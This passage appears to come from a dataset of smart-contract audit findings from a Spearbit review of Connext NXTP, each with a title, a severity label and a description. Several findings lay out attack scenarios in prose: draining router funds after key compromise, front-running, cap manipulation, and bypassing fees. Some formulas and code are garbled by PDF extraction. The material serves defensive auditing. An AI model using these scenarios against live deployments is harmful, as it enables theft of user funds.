["Spearbit", "ConnextNxtp", "Severity: Medium Risk"]}, {"title": "User may not be able to override slippage on destination", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "If BridgeFacet.execute() is executed before BridgeFacet.forceUpdateSlippage(), user won't be able to update slippage on the destination chain. In this case, the slippage specified on the source chain is used. Due to different conditions on these chains, a user may want to specify different slippage values. This can result in user loss, as a slippage higher than necessary will result the swap trade being sandwiched.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Medium Risk"]}, {"title": "Do not rely on token balance to determine when cap is reached", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Connext Diamond defines a cap on each token. Any transfer making the total token balance more than the cap is reverted. uint256 custodied = IERC20(_local).balanceOf(address(this)) + _amount; uint256 cap = s.caps[key]; if (cap > 0 && custodied > cap) { revert RoutersFacet__addLiquidityForRouter_capReached(); } Anyone can send tokens to Connext Diamond to artificially increase the custodied amount since it depends on the token balance. This can be an expensive attack but it can become viable if price of a token (including next assets) drops.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Medium Risk"]}, {"title": "Router recipient can be configured more than once", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The comments from the setRouterRecipient function mentioned that the router should only be able to set the recipient once. Otherwise, no problem is solved. However, based on the current implementation, it is possible for the router to set its recipient more than once. /** File: RoutersFacet.sol 394: 395: 396: 397: 398: 399: 400: 401: * @notice Sets the designated recipient for a router * @dev Router should only be able to set this once otherwise if router key compromised, * no problem is solved since attacker could just update recipient * @param router Router address to set recipient * @param recipient Recipient Address to set to router */ function setRouterRecipient(address router, address recipient) external onlyRouterOwner(router) { Let's assume that during router setup, the setupRouter function is being called and the owner is set to Alice's first EOA (0x123), and the recipient is set to Alice's second EOA (0x456). Although the comment mentioned that the setRouterRecipient should only be set once, this is not true because this function will only revert if the _- prevRecipient == recipient. As long as the new recipient is not the same as the previous recipient, the function will happily accept the new recipient. Therefore, if the router's signing key is compromised by Bob (attacker), he could call the setRouterRecipient function to change the new recipient to his personal EOA and drain the funds within the router. The setRouterRecipient function is protected by onlyRouterOwner modifier. Since Bob's has the compromised router's signing key, he will be able to pass this validation check. 21 /** File: RoutersFacet.sol 157: 158: 159: 160: 161: 162: 163: 164: 165: _; } * @notice Asserts caller is the router owner (if set) or the router itself */ modifier onlyRouterOwner(address _router) { address owner = s.routerPermissionInfo.routerOwners[_router]; if (!((owner == address(0) && msg.sender == _router) || owner == msg.sender)) revert RoutersFacet__onlyRouterOwner_notRouterOwner(); The second validation is at Line 404, which checks if the new recipient is not the same as the previous recipient. The recipient variable is set to Bob's EOA wallet, while _prevRecipient variable is set to Alice's second EOA (0x456). Therefore, the condition at Line 404 is False, and it will not revert. So Bob successfully set the recipient to his EOA at Line 407. File: RoutersFacet.sol 401: 402: 403: 404: 405: 406: 407: function setRouterRecipient(address router, address recipient) external onlyRouterOwner(router) { // Check recipient is changing address _prevRecipient = s.routerPermissionInfo.routerRecipients[router]; if (_prevRecipient == recipient) revert RoutersFacet__setRouterRecipient_notNewRecipient(); // Set new recipient s.routerPermissionInfo.routerRecipients[router] = recipient; Per the Github discussion, the motivation for such a design is the following: If a routers signing key is compromised, the attacker could drain the liquidity stored on the contract and send it to any specified address. This effectively means the key is in control of all unused liquidity on chain, which prevents router operators from adding large amounts of liquidity directly to the contract. Routers should be able to delegate the safe withdrawal address of any unused liquidity, creating a separation of concerns between router key and liquidity safety. In summary, the team is trying to create a separation of concerns between router key and liquidity safety. With the current implementation, there is no security benefit of segregating the router owner role and recipient role unless the router owner has been burned (e.g. set to address zero). Because once the router's signing key is compromised, the attacker can change the recipient anyway. The security benefits of separation of concerns will only be achieved if the recipient can truly be set only once.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Medium Risk"]}, {"title": "The set of tokens in an internal swap pool cannot be updated", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Once a swap is initialized by the owner or an admin (indexed by the key parameter) the _pooledTo- kens or the set of tokens used in this stable swap pool cannot be updated. Now the s.swapStorages[_key] pools are used in other facets for assets that have the hash of their canonical token id and canonical domain equal to _key, for example when we need to swap between a local and adopted asset or when a user provides liquidity or interact with other external endpoints of StableSwapFacet. If the submitted set of tokens to this pool _pooledTokens beside the local and adopted token corresponding to _key include some other bad/malicious tokens, users' funds can be at risk in the pool in question. If this happens, we need to pause the protocol, push an update, and initializeSwap again.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Medium Risk"]}, {"title": "An incorrect decimal supplied to initializeSwap for a token cannot be corrected", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Once a swap is initialized by the owner or an admin (indexed by the key parameter) the decimal precisions per tokens, and therefore tokenPrecisionMultipliers cannot be changed. If the supplied decimals also include a wrong value, it would cause incorrect calculation when a swap is being made and currently there is no update mechanism for tokenPrecisionMultipliers nor a mechanism for removing the swapStorages[_key].", "labels": ["Spearbit", "ConnextNxtp", "Severity: Medium Risk"]}, {"title": "Presence of delegate not enforced", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "A delegate address on the destination chain can be used to fix stuck transactions by changing the slippage limits and by re-executing transactions. However, the presence of a delegate address isn't checked in _xcall(). Note: set to medium risk because tokens could get lost 23 function forceUpdateSlippage(TransferInfo calldata _params, uint256 _slippage) external ,! onlyDelegate(_params) { ... } function execute(ExecuteArgs calldata _args) external nonReentrant whenNotPaused returns (bytes32) { (bytes32 transferId, DestinationTransferStatus status) = _executeSanityChecks(_args); ... } function _executeSanityChecks(ExecuteArgs calldata _args) private view returns (bytes32, ,! DestinationTransferStatus) { // If the sender is not approved relayer, revert if (!s.approvedRelayers[msg.sender] && msg.sender != _args.params.delegate) { revert BridgeFacet__execute_unapprovedSender(); } }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Medium Risk"]}, {"title": "Relayer could lose funds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The xReceive function on the receiver side can contain unreliable code which Relayer is unaware of. In the future, more relayers will participate in completing the transaction. Consider the following scenario: 1. Say that Relayer A executes the xReceive function on receiver side. 2. In the xReceive function, a call to withdraw function in a foreign contract is made where Relayer A is holding some balance. 3. If this foreign contract is checking tx.origin (say deposit/withdrawal were done via third party), then Relayer A's funds will be withdrawn without his permission (since tx.origin will be the Relayer).", "labels": ["Spearbit", "ConnextNxtp", "Severity: Medium Risk"]}, {"title": "TypedMemView.sameType does not use the correct right shift value to compare two bytes29s", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function sameType should shift 2 x 12 + 3 bytes to access the type flag (TTTTTTTTTT) when comparing it to 0. This is due to the fact that when using bytes29 type in bitwise operations and also comparisons to 0, a paramater of type bytes29 is zero padded from the right so that it fits into a uint256 under the hood. 0x TTTTTTTTTT AAAAAAAAAAAAAAAAAAAAAAAA LLLLLLLLLLLLLLLLLLLLLLLL 00 00 00 Currently, sameType only shifts the xored value 2 x 12 bytes so the comparison compares the type flag and the 3 leading bytes of memory address in the packing specified below: // First 5 bytes are a type flag. // - ff_ffff_fffe is reserved for unknown type. // - ff_ffff_ffff is reserved for invalid types/errors. // next 12 are memory address // next 12 are len // bottom 3 bytes are empty The function is not used in the codebase but can pose an important issue if incorporated into the project in the future. function sameType(bytes29 left, bytes29 right) internal pure returns (bool) { return (left ^ right) >> (2 * TWELVE_BYTES) == 0; }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Medium Risk"]}, {"title": "Incorrect formula for the scaled amplification coefficient in NatSpec comments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "In the context above, the scaled amplification coefficient a is described by the formula An(n (cid:0) 1) where A is the actual amplification coefficient in the stable swap invariant equation for n tokens. * @param a the amplification coefficient * n * (n - 1) ... The actual adjusted/scaled amplification coefficient would need to be Ann(cid:0)1 and not An(n (cid:0) 1), otherwise, most of the calculations done when swapping between 2 tokens in a pool with more than 2 tokens would be wrong. For the special case of n = 2, those values are actually equal 22(cid:0)1 = 2 = 2 (cid:1) 1. So for swaps or pools that involve only 2 tokens, the issue in the comment is not so critical. But if the number of tokens are more than 2, then we need to make sure we calculate and feed the right parameter to AppStorage.swapStorages.{initial, future}A", "labels": ["Spearbit", "ConnextNxtp", "Severity: Medium Risk"]}, {"title": "RootManager.propagate does not operate in a fail-safe manner", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "A bridge failure on one of the supported chains will cause the entire messaging network to break down. When the RootManager.propagate function is called, it will loop through the hub connector of all six chains (Ar- bitrum, Gnosis, Multichain, Optimism, Polygon, ZKSync) and attempt to send over the latest aggregated root by making a function call to the respective chain's AMB contract. There is a tight dependency between the chain's AMB and hub connector. The problem is that if one of the function calls to the chain's AMB contract reverts (e.g. one of the bridges is paused), the entire RootManager.propagate function will revert, and the messaging network will stop working until someone figure out the problem and manually removes the problematic hub connector. As Connext grows, the number of chains supported will increase, and the risk of this issue occurring will also increase.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Medium Risk"]}, {"title": "Arborist once whitelisted cannot be removed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Arborist has the power to write over the Merkle root. In case Arborist starts misbehaving (compro- mised or security issue) then there is no way to remove this Arborist from the whitelist.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Medium Risk"]}, {"title": "WatcherManager is not set correctly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The setWatcherManager function missed to actually update the watcherManager, instead it is just emitting an event mentioning that Watcher Manager is updated when it is not. This could become a problem once new modules are added/revised in WatcherManager contract and Watcher- Client wants to use this upgraded WatcherManager. WatcherClient will be forced to use the outdated Watcher- Manager contract code.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Medium Risk"]}, {"title": "Check __GAPs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "All __GAPs have the same size, while the different contracts have a different number of storage variables. If the __GAP size isn't logical it is more difficult to maintain the code. Note: set to a risk rating of medium because the probably of something going wrong with future upgrades is low to medium, and the impact of mistakes would be medium to high. LPToken.sol: uint256[49] private __GAP; // should probably be 50 OwnerPausableUpgradeable.sol: uint256[49] private __GAP; // should probably be 50 uint256[49] private __GAP; // should probably be 48 StableSwap.sol: uint256[49] private __GAP; // should probably be 48 Merkle.sol: uint256[49] private __GAP; // should probably be 47 ProposedOwnable.sol: 27", "labels": ["Spearbit", "ConnextNxtp", "Severity: Medium Risk LPToken.sol#L16, OwnerPausableUpgradeable.sol#L16, StableSwap.sol#L39, Merkle.sol#L37,"]}, {"title": "Message can be delivered out of order", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Messages can be delivered out of order on the spoke. Anyone can call the permissionless prove- AndProcess to process the messages in any order they want. A malicious user can force the spoke to process messages in a way that is beneficial to them (e.g., front-run).", "labels": ["Spearbit", "ConnextNxtp", "Severity: Medium Risk"]}, {"title": "Extra checks in _verifySender() of GnosisBase", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "According to the Gnosis bridge documentation the source chain id should also be checked using messageSourceChainId(). This is because in the future the same arbitrary message bridge contract could handle requests from different chains. If a malicious actor would be able to have access to the contract at mirrorConnector on a to-be-supported chain that is not the MIRROR_DOMAIN, they can send an arbitrary root to this mainnet/L1 hub connector which the con- nector would mark it as coming from the MIRROR_DOMAIN. So the attacker can spoof/forge function calls and asset transfers by creating a payload root and using this along with their access to mirrorConnector on chain to send a cross-chain processMessage to the Gnosis hub connector and after they can use their payload root and proofs to forge/spoof transfers on the L1 chain. Although it is unlikely that any other party could add a contract with the same address as _amb on another chain, it is safer to add additional checks. function _verifySender(address _amb, address _expected) internal view returns (bool) { require(msg.sender == _amb, \"!bridge\"); return GnosisAmb(_amb).messageSender() == _expected; } 28", "labels": ["Spearbit", "ConnextNxtp", "Severity: Medium Risk"]}, {"title": "Absence of Minimum delayBlocks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Owner can accidentally set delayBlocks as 0 (or a very small delay block) which will collapse the whole fraud protection mechanism. Since there is no check for minimum delay before setting a new delay value so even a low value will be accepted by setDelayBlocks function function setDelayBlocks(uint256 _delayBlocks) public onlyOwner { require(_delayBlocks != delayBlocks, \"!delayBlocks\"); emit DelayBlocksUpdated(_delayBlocks, delayBlocks); delayBlocks = _delayBlocks; }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Medium Risk"]}, {"title": "Add extra 0 checks in verifyAggregateRoot() and proveMessageRoot()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The functions verifyAggregateRoot() and proveMessageRoot() verify and confirm roots. A root value of 0 is a special case. If this value would be allowed, then the functions could allow invalid roots to be passed. Currently the functions verifyAggregateRoot() and proveMessageRoot() don't explicitly verify the roots are not 0. 29 function verifyAggregateRoot(bytes32 _aggregateRoot) internal { if (provenAggregateRoots[_aggregateRoot]) { return; } ... // do several verifications provenAggregateRoots[_aggregateRoot] = true; ... } function proveMessageRoot(...) ... { if (provenMessageRoots[_messageRoot]) { return; } ... // do several verifications provenMessageRoots[_messageRoot] = true; }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Medium Risk"]}, {"title": "_removeAssetId() should also clear custodied", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "In one of the fixes in PR 2530, _removeAssetId() doesn't clear custodied as it is assumed to be 0. function _removeAssetId(...) ... { // NOTE: custodied will always be 0 at this point } However custodied isn't always 0. Suppose cap & custodied have a value (!=0), then _setLiquidityCap() is called to set the cap to 0. The function doesn't reset the custodied value so it will stay at !=0.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Remove liquidity while paused", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function removeLiquidity() in StableSwapFacet.sol has a whenNotPaused modifier, while the comment shows Liquidity can always be removed, even when the pool is paused.. On the other hand function removeLiquidity() in StableSwap.sol doesn't have this modifier. StableSwapFacet.sol#L394-L446 // Liquidity can always be removed, even when the pool is paused. function removeLiquidity(...) external ... nonReentrant whenNotPaused ... { ... } function removeLiquidityOneToken(...) external ... nonReentrant whenNotPaused function removeLiquidityImbalance(...) external ... nonReentrant whenNotPaused ... { ... } ... { ... } StableSwap.sol#L394-L446 // Liquidity can always be removed, even when the pool is paused. function removeLiquidity(...) external ... nonReentrant ... { ... } function removeLiquidityOneToken(...) external ... nonReentrant whenNotPaused function removeLiquidityImbalance(...) external ... nonReentrant whenNotPaused ... { ... } ... { ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Relayers can frontrun each other's calls to BridgeFacet.execute", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Relayers can front run each other's calls to BridgeFacet.execute. Currently, there is no on-chain mechanism to track how many fees should be allocated to each relayer. All the transfer bump fees are funneled into one address s.relayerFeeVault.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "OptimismHubConnector.processMessageFromRoot emits MessageProcessed for already processed messages", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Calls to processMessageFromRoot with an already processed _data still emit MessageProcessed. This might cause issues for off-chain agents like relayers monitoring this event.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Add max cap for domains", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Currently there isn't any cap on the maximum amount of domains which system can support. If the size of the domains and connectors grow, at some point due to out-of-gas errors in updateHashes function, both addDomain and removeDomain could DOS.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "In certain scenarios calls to xcall... or addRouterLiquidity... can be DoSed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The owner or an admin can frontrun (or it can be by an accident) a call that:  A router has made on a canonical domain of a canonical token to supply that token as liquidity OR  A user has made to xcall... supplying a canonical token on its canonical domain. The frontrunning call would set the cap to a low number (calling updateLiquidityCap). This would cause the calls mentioned in the bullet list to fail due to the checks against IERC20(_local).balanceOf(address(this)).", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Missing a check against address(0) in ConnextPriceOracle's constructor", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "When ConnextPriceOracle is deployed an address _wrapped is passed to its constructor. The current codebase does not check whether the passed _wrapped can be an address(0) or not.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "_executeCalldata() can revert if insufficient gas is supplied", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function _executeCalldata() contains the statement gasleft() - 10_000. This statement can revert if the available gas is less than 10_000. Perhaps this is the expected behaviour. Note: From the Tangerine Whistle fork only a maximum 63/64 of the available gas is sent to contract being called. Therefore, 1/64th is left for the calling contract. function _executeCalldata(...) ... { ... (success, returnData) = ExcessivelySafeCall.excessivelySafeCall(_params.to, gasleft() - 10_000, ... ); ... ,! }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Be aware of precompiles", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The external calls by _executeCalldata() could call a precompile. Different chains have creative precompile implementations, so this could in theory pose problems. For example precompile 4 copies memory: what-s-the-identity-0x4-precompile Note: precompiles link to dedicated pieces of code written in Rust or Go that can be called from the EVM. Here are a few links for documentation on different chains: moonbeam precompiles, astar precompiles function _executeCalldata(...) ... { ... (success, returnData) = ExcessivelySafeCall.excessivelySafeCall( _params.to, ...); } else { returnData = IXReceiver(_params.to).xReceive(...); } ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Upgrade to solidity 0.8.17", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Solidity 0.8.17 released a bugfix where the optimizer could incorrectly remove storage writes if the code fit a certain pattern (see this security alert). This bug was introduced in 0.8.13. Since Connext is using the legacy code generation pipeline, i.e., compiling without the via-IR flag, the current code is not at risk. This is because assembly blocks dont write to storage. However, if this changes and Connext compiles through via-IR code generation, the code is more likely to be affected. One reason to use this code generation pipeline could be to enable gas optimizations not available in legacy code generation.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Add domain check in setupAssetWithDeployedRepresentation()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function setupAssetWithDeployedRepresentation() links a new _representation asset. However this should not be done on the canonical domain. So good to check this to prevent potential mistakes. function setupAssetWithDeployedRepresentation(...) ... { bytes32 key = _enrollAdoptedAndLocalAssets(_adoptedAssetId, _representation, _stableSwapPool, _canonical); ... ,! }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "If an adopted token and its canonical live on the same domain the cap for the custodied amount is applied for each of those tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "If _local is an adopted asset that lives on its canonical's original chain, then we are comparing the to-be-updated balance of this contract (custodied) with s.caps[key]. That means we are also comparing the balance of an adopted asset with the property above with the cap. For example, if A is the canonical token and B the adopted, then cap = s.caps[key] is used to cap the custodied amount in this contract for both of those tokens. So if the cap is 1000, the contract can have a balance of 1000 A and 1000 B, which is twice the amount meant to be capped. This is true basically for any approved asset with the above properties. When the owner or the admin calls setu- pAsset: // File: https://github.com/connext/nxtp/blob/32a0370edc917cc45c231565591740ff274b5c05/packages/deploym ents/contracts/contracts/core/connext/facets/TokenFacet.sol#L164-L172 ,! function setupAsset( c TokenId calldata _canonical, uint8 _canonicalDecimals, string memory _representationName, string memory _representationSymbol, address _adoptedAssetId, address _stableSwapPool, uint256 _cap ) external onlyOwnerOrAdmin returns (address _local) { such that _canonical.domain == s.domain and _adoptedAssetId != 0, then this asset has the property in ques- tion.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "There are no checks/constraints against the _representation provided to setupAssetWithDe- ployedRepresentation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "setupAssetWithDeployedRepresentation is similar to setupAsset in terms of functionality, except it does not deploy a representation token if necessary. It actually uses the _representation address given as the representation token. The _representation parameter given does not have any checks in terms of functionality compared to when setupAsset which deploys a new BridgeToken instance: // File: packages\\deployments\\contracts\\contracts\\core\\connext\\facets\\TokenFacet.sol#L399 _token = address(new BridgeToken(_decimals, _name, _symbol)); Basically, representation needs to implement IBridgeToken (mint, burn, setDetails, ... ) and some sort of IERC20. Otherwise, if a function from IBridgeToken is not implemented or if it does not have IERC20 functionality, it can cause failure/reverts in some functions in this codebase. Another thing that is important is that the decimals for _representation should be equal to the decimals precision of the canonical token. And that _representation should not be able to update/change its decimals. Also, this opens an opportunity for a bad owner or admin to provide a malicious _representation to this function. This does not have to be a malicious act, it can also happen by mistake from for example an admin. Additionally the Connext Diamond must have the \"right\" to mint() and burn() the tokens.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "In dequeueVerified when no verified items are found in the queue last == first - 1", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The comment in dequeueVerified mentions that when no verified items are found in the queue, then last == first. But this is not true since the loop condition is last >= first and the loop only terminates (not considering the break) when last == first - 1. It is important to correct this incorrect statement in the comment, since a dev/user can by mistake take this state- ment as true and modify/use the code with this incorrect assumption in mind.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Dirty bytes in _loc and _len can override other values when packing a typed memory view in unsafeBuildUnchecked", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "For a TypeedMemView, the location and the length are supposed to occupy 12 bytes (uint96), but the type used for these values for the input parameters for unsafeBuildUnchecked is uint256. This would allow those values to carry dirty bytes and when the following calculations are performed: newView := shl(96, or(newView, _type)) // insert type newView := shl(96, or(newView, _loc)) // insert loc newView := shl(24, or(newView, _len)) // empty bottom 3 bytes _loc can potentially manipulate the type section of the view and _len can potentially manipulate both the _loc and the _type section.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "To use sha2, hash160 and hash256 of TypedMemView the hard-coded precompile addresses would need to be checked to make sure they return the corresponding hash values.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "sha2, hash160 and hash256 assume that the precompile contracts at address(2) and address(3) calculate and return the sha256 and ripemd160 hashes of the provided memory chunks. These assumptions depend on the chain that the project is going to be deployed on.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "sha2, hash160 and hash256 of TypedMemView.sha2 do not clear the memory after calculating the hash", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "When a call to the precompile contract at address(2) (or at address(3)) is made, the returned value is placed at the slot pointed by the free memory pointer and then placed on the stack. The free memory pointer is not incremented to account for this used memory position nor the code tries to clean this memory slot of 32 bytes. Therefore after a call to sha2, hash160 or hash256, we would end up with dirty bytes.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Fee on transfer token support", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "It seems that only the addLiquidity function is currently supporting the fee on transfer token. All operations like swapping are prohibiting the fee on transfer token. Note: The SwapUtilsExternal.sol contract allow fee on transfer token and as per product team, this is expected from this token", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Fee on transfer tokens can stuck the transaction", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Consider the following scenario. 1. Assume User has made a xcall with amount A of token X with calldata C1. Since their was no fee while transferring funds, transfer was a success. 2. Now, before this amount can be transferred on the destination domain,token X introduced a fee on transfer. 3. Relayer now executes this transaction on destination domain via _handleExecuteTransaction function on BridgeFacet.sol#L756. 4. This transfers the amount A of token X to destination domain but since now the fee on this token has been introduced, destination domain receives amount A-delta. 5. This calldata is called on destination domain but the amount passed is A instead of A-delta so if the IXRe- ceiver has amount check then it will fail because it will now expect A amount when it really got A-delta amount.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Initial Liquidity Provider can trick the system", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Since there is no cap on the amount which initial depositor can deposit, an attacker can trick the system in bypassing admin fees for other users by selling liquidity at half admin fees. Consider the following scenario. 1. User A provides the first liquidity of a huge amount. 2. Since there aren't any fees from initial liquidity, admin fees are not collected from User A. 3. Now User A can sell his liquidity to other users with half admin fees. 4. Other users can mint larger liquidity due to lesser fees and User A also get benefit of adminFees/2.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Ensure non-zero local asset in _xcall()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Local asset fetched in _xcall() is not verified to be a non-zero address. In case, if token mappings are not updated correctly and to future-proof from later changes, it's better to revert if a zero address local asset is fetched. local = _getLocalAsset(key, canonical.id, canonical.domain);", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Use ExcessivelySafeCall to call xReceive()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "xReceive(). This is done to avoid copying large amount of return data in memory. This same attack vector exists for non-reconciled transfers, however in this case a usual function call is made for xReceive(). For However, in case non-reconciled calls fail due to this error, they can always be retried after reconciliation.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "A router's liquidity might get trapped if the router is removed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "If the owner or a user with Role.Router Role removes a router that does not implement calling re- moveRouterLiquidity or removeRouterLiquidityFor, then any liquidity remaining in the contract for the removed router cannot be transferred back to the router.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "In-flight transfers by the relayer can be reverted when setMaxRoutersPerTransfer is called before- hand by a lower number", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "For in-flight transfers where an approved sequencer has picked and signed an x number of routers for a transfer, from the time a relayer or another 3rd party grabs this ExecuteArgs _args to the time this party submits it to the destination domain by calling execute on a connext instance, the owner or an admin can call setMaxRoutersPerTransfer with a number lower than x on purpose or not. And this would cause the call to execute to revert with BridgeFacet__execute_maxRoutersExceeded.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "All the privileged users that can call withdrawSwapAdminFees would need to trust each other", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The owner needs to trust all the admins and also all admins need to trust each other. Since any admin can call withdrawSwapAdminFees endpoint to withdraw all the pool's admin fees into their account.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "The supplied _a to initializeSwap cannot be directly updated but only ramped", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Once a swap is initialized by the owner or an admin (indexed by the key parameter) the supplied _a (the scaled amplification coefficient, Ann(cid:0)1 ) to initializeSwap cannot be directly updated but only ramped. The owner or the admin can still call rampA to update _a, but it will take some time for it to reach the desired value. This is mostly important if by mistake an incorrect value for _a is provided to initializeSwap.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Low Risk"]}, {"title": "Inconsistent behavior when xcall with a non-existent _params.to", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "A xcall with a non-existent _params.to behaves differently depending on the path taken. 1. Fast Liquidity Path - Use IXReceiver(_params.to).xReceive. The _executeCalldata function will revert if _params.to is non-existent. Which technically means that the execution has failed. 2. Slow Path - Use ExcessivelySafeCall.excessivelySafeCall. This function uses the low-level call, which will not revert and will return true if the _params.to is non-existent. The _executeCalldata function will return with success set to True, which means the 